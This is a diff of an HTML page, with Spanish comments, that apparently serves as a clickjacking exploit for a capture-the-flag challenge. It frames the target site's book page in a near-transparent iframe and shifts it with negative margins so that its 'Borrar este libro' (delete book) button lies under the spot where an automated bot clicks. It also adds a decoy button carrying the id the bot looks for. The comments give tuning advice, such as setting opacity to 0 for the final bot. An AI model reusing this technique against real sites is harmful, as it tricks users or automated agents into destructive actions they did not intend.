@@ -6,39 +6,39 @@
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; }
 
-        /* Contenedor para posicionar el iframe exactamente donde está el botón de borrar */
-        .crop {
-            position: absolute;
-            /* Estos valores son críticos. Si el bot no clica, ajusta el TOP */
-            top: 0px; 
-            left: 0px;
-            width: 100%;
-            height: 100%;
-            overflow: hidden;
-        }
-
-        /* El iframe ES el botón objetivo para el bot */
+        /* El botón que el bot busca (ID OBJETIVO) */
+        /* Lo hacemos gigante: ocupe TODA la pantalla */
         #objetivo {
             position: absolute;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: 1; /* Estará al fondo */
+            opacity: 0.001;
+        }
+
+        /* El IFRAME de la librería */
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
             width: 100%;
-            height: 2000px; /* Página completa */
+            height: 1000px;
             border: none;
-            /* AJUSTE DE POSICIÓN: 
-               Subimos la página para que el botón "Borrar este libro" 
-               quede justo en la esquina superior izquierda, que es donde los bots suelen clicar por defecto si no especificas coordenadas */
-            margin-top: -500px; 
-            margin-left: -20px;
-            /* Casi invisible pero 'existente' */
-            opacity: 0.5; 
-            z-index: 100;
+            z-index: 2; /* Estará ARRIBA del botón */
+            /* Calibra el margin-top para que el botón 'Borrar' de la web 
+               real quede donde el bot suele hacer clic (el centro de la pantalla) */
+            margin-top: -720px; 
+            opacity: 0.5; /* Ponlo en 0 para el bot final */
         }
     </style>
 </head>
 <body>
 
-    <div class="crop">
-        <iframe id="objetivo" src="https://ctf.fap.hispasec.com:8018/books/1"></iframe>
-    </div>
+    <button id="objetivo">CLICK</button>
+
+    <iframe src="https://ctf.fap.hispasec.com:8018/books/1"></iframe>
 
 </body>
 </html>
